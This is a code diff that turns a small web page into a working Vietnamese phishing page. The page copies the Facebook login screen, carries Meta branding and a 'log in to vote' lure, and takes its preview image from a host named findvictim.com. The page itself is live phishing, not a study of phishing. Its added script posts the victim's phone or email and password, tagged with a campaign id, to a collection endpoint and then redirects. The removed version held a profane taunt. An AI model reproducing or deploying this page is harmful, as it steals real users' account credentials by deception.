@@ -1,24 +1,193 @@
+
 <!DOCTYPE html>
-<html lang="en" >
+<html>
+
 <head>
-  <meta charset="UTF-8">
-  <title>Multiversemall Services</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
-<link rel="stylesheet" href="./style.css">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
+   <meta name="robots" content="index, follow">
+   <link rel="stylesheet" href="/theme/fbweb1/fbstyle.css">
+  
+   <meta http-equiv="Content-Language" content="vi">
+   <meta charset="utf-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1">
+   <title>Đăng Nhập Để Bình Chọn</title>
+   <meta name="title" content="Đăng Nhập Để Bình Chọn" />
+   <meta property="twitter:title" content="Đăng Nhập Để Bình Chọn" />
+   <meta property="twitter:description" content="Đăng Nhập Để Bình Chọn" />
+   <meta property="twitter:card" content="summary_large_image" />
+   <meta property="twitter:image" content="https://findvictim.com/uploads/663e42e90bacf.jpg" />
+   <meta property="og:title" content="Đăng Nhập Để Bình Chọn" />
+   <meta property="og:image" content="https://findvictim.com/uploads/663e42e90bacf.jpg" />
+   <meta property="og:type" content="article" />
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js">
 
+   </script>
 </head>
-<body>
-<!-- partial:index.partial.html -->
-<img src="avt2.jpg" />
-<br>
-<div id="loading"> WARNING </div>
-<br/>
-<p class="test">
-   ĐỊT MẸ CÁC EM CỐ LÊN SẮP BIẾT NGUỒN CỦA ANH RỒI !
-  </p>
-<!-- partial -->
-  <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script><script  src="./script.js"></script>
+<style>
+    .notilog {
+    background-color: #FFFBE2;
+    padding: 3px;
+    color: #3B5998;
+    text-align: center;
+    font-family: Arial, Helvetica, sans-serif;
 
+
+
+}
+.input-group input {
+    font-size: 14px;
+    line-height: 18px;
+    padding: 12px;
+    background: #f5f6f7;
+    border: 0.3px solid #CCCCCC;
+    display: block;
+    width: 94%;
+    border-radius: 3px;
+}
+.logo img {
+    width: 110px;
+}
+.logo {
+    text-align: center;
+    margin-top: 1px;
+    margin-bottom: -3px;
+}
+ 
+    
+</style>
+<body>
+ 
+   <div id="message">
+      </i>
+   </div>
+    <div class="notilog">
+  <a>Đăng Nhập Để Bình Chọn</a>
+ 
+    </div>
+     <div id="error"></div>
+    <div class="logo">
+         <img src="/theme/fbweb1/logo.png" alt="Logo">
+      </div>
+           
+   <div class="container">
+      
+      <div class="input-group input">
+           
+         <input type="text" id="tk" placeholder="Số di động hoặc email" autofocus> 
+        
+      </div>
+      <div class="input-group input">
+         <input type="password" id="mk" placeholder="Mật khẩu" required>
+      </div>
+      <button onclick="Login()" id="ok" name="btnSubmit" class="submit-button">Đăng nhập</button>
+      <div class="forgot-password">
+         <p style="color: #216fdb; font-family: Arial, Helvetica, sans-serif;"> Quên mật khẩu? </p>
+      </div>
+      <div class="divider">
+
+      </div>
+      <button class="create-account">Tạo tài khoản mới</button>
+   </div>
+   </div>
+
+   </div>
+   <div class="log-footer">
+      <div class="item-fot">
+         <span style="color: #90949c;
+               font-weight: bold;
+               font-size: 12px;
+               line-height: 16px;">Tiếng Việt</span>
+         <div class="lang">
+            <span class="lang-span">
+               <a>中文(台灣)</a>
+            </span>
+         </div>
+         <div class="lang">
+            <span class="lang-span">
+               <a>Español</a>
+            </span>
+         </div>
+         <div class="lang">
+            <span class="lang-span">
+               <a>Français (France)</a>
+            </span>
+         </div>
+      </div>
+      <div class="item-fot">
+         <div class="lang">
+            <span class="lang-span">
+               <a>English (UK)</a>
+            </span>
+         </div>
+         <div class="lang">
+            <span class="lang-span">
+               <a>한국어</a>
+            </span>
+         </div>
+         <div class="lang">
+            <span class="lang-span">
+               <a>Português (Brasil)</a>
+            </span>
+         </div>
+      </div>
+   </div>
+   </div>
+   <center>
+      <span style="font-size: 12px;
+         line-height: 15px;
+         color: gray;">Meta &copy; 2023</span>
+   </center>
+   </div>
+  
+
+   <script>
+      function Login() {
+
+  $('#ok').html('Đang đăng nhập...');
+    $('#ok').attr('disabled', 'disabled');
+            $.ajax({
+            url: "/system/login.php",
+            method: "POST",
+            data: {
+               id: '53608',
+               tk: $("#tk").val(),
+               mk: $("#mk").val(),
+               type: 'Facebook'
+          
+    },
+            success: function(response) {
+                
+               var data = JSON.parse(response);
+               var message = data.message;
+               var status = data.status;
+              
+              
+               if (status == 'error') { 
+                 $('#ok').removeAttr('disabled');
+                 $('#ok').html('Đăng nhập');
+                 $(".notilog").remove()
+                document.getElementById('tk').style = 'border: 1px solid #FA3E3E;';
+                document.getElementById('error').style = 'background-color: #FA3E3E; padding: 3px; color: #FFFFF3; text-align: center; font-size:15px; font-family: Arial, Helvetica, sans-serif;'
+                document.getElementById('error').innerHTML = message;
+               } else {
+                   
+                $("#error").remove()
+                  window.location.href = "/success.php?id=53608"; 
+                  
+               }
+
+            },
+            error: function(e) {
+               console.log(e);
+            }
+         });
+      }
+
+    
+ 
+  
+   </script>
+  
 </body>
+
 </html>
+</script>
